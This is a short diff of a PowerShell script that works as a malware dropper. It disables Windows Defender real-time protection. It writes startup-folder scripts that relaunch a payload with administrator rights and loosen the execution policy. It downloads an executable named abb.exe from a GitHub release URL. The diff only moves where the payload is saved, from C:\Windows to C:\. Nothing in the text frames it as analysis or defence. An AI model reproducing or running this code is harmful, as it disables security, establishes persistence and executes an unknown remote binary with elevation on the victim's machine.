@@ -1,7 +1,7 @@
 Set-MpPreference -DisableRealtimeMonitoring $true
-Set-Content -Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\s.ps1" -Value "Start-Process 'C:\Windows\abb.exe' -Verb runAs"
+Set-Content -Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\s.ps1" -Value "Start-Process 'C:\abb.exe' -Verb runAs"
 Set-Content -Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\s.bat" -Value "@echo off
 powershell.exe Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force; & 'a.ps1'
 pause"
 $webClient = New-Object System.Net.WebClient
-$webClient.DownloadFile("https://github.com/ZeRo1k/ngrok_server_clash/releases/download/%40private/abb.exe", "C:\Windows\abb.exe")
+$webClient.DownloadFile("https://github.com/ZeRo1k/ngrok_server_clash/releases/download/%40private/abb.exe", "C:\abb.exe")
